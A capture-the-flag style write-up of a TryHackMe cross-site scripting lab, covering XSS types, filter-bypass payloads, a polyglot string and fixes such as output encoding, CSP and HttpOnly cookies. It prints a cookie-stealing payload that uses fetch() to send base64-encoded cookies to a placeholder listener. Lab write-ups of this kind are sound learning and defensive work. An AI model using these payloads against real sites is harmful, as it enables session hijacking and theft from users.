# Cross-Site Scripting (XSS) — TryHackMe

**Date:** 2026-07-15  
**Category:** Web, Client-Side  
**Skills used:** XSS exploitation, filter/context bypass, payload crafting  

> **TL;DR:** Worked through all XSS types and crafted context-specific payloads in the
> TryHackMe lab — escaping attributes, tags, and JavaScript strings, bypassing filters, and
> building a cookie-stealing payload. Finished on polyglots that fire across multiple contexts
> at once.

## Overview
Cross-Site Scripting (XSS) is a web vulnerability that allows an attacker to inject malicious
code into a trusted website. When another user visits the affected page, the malicious script
runs in their browser as if it came from the legitimate website — so XSS executes
**client-side**, in the victim's browser, not on the server.

## Types of XSS
- **Reflected** — the payload is in the request and reflected straight back in the response
  (e.g. a search term echoed on the page).
- **Stored** — the payload is saved by the app (e.g. a comment) and served to every visitor.
- **DOM-based** — the vulnerability is in client-side JavaScript that handles input unsafely,
  never touching the server.
- **Blind** — a stored payload that fires somewhere you can't see (e.g. an admin panel);
  confirmed via an out-of-band callback.

## Hands-On: TryHackMe Lab
Crafted a payload for each XSS type, adapting to the injection context and any filters. Each
payload below escapes a *different* situation — which is the core skill:

```html
1.  <script>alert('THM');</script>
    → Simple payload, no filtering.

2.  "><script>alert('THM');</script>
    → Breaks out of an HTML attribute value first.

3.  </textarea><script>alert('THM');</script>
    → Closes a <textarea> before injecting.

4.  ';alert('THM');//
    → Breaks out of an existing JavaScript string.

5.  <sscriptcript>alert('THM');</sscriptcript>
    → Beats a filter that strips "script" once (non-recursive):
      removing the inner "script" leaves a valid <script> tag.

6.  /images/image.jpg" onload="alert('THM');
    → Beats a filter blocking "<" and ">" by using an event
      handler on an existing tag instead of a new one.
```

**Cookie theft (impact demo):** to show real impact rather than just a popup, I built a
payload that exfiltrates the victim's cookies to a server I control:

```html
</textarea><script>fetch('http://URL_OR_IP:PORT?cookie=' + btoa(document.cookie));</script>
```

This closes the `<textarea>`, then uses `fetch()` to send the base64-encoded `document.cookie`
to an attacker-controlled listener — turning a proof-of-concept alert into session hijacking.

## The Fix (Defensive View)
The root cause is untrusted input being rendered as executable code. Defenses, strongest first:

- **Context-aware output encoding** — the real fix. Encode data for the context it lands in
  (HTML body, attribute, JS, URL) so it's rendered as text, never executed.
- **Content Security Policy (CSP)** — restricts where scripts can load from, so injected inline
  scripts are blocked even if one slips through.
- **HttpOnly cookies** — prevents JavaScript from reading `document.cookie`, which directly
  defeats the cookie-theft payload above.
- **Input validation (allow-lists)** — useful defense-in-depth, but not a substitute for
  output encoding.

## What I Learned
Learned the basics of XSS and why it works, the different types, and — most importantly — how
to adapt payloads to the injection context and to specific filters, rather than relying on one
"magic" payload. The filter-bypass payloads (#5 and #6) drove home that a blocklist that strips
a keyword once, or only blocks certain characters, is not real protection.

I also learned about **polyglots** — strings that break out of attributes and tags and bypass
filters simultaneously, so one payload fires across many contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
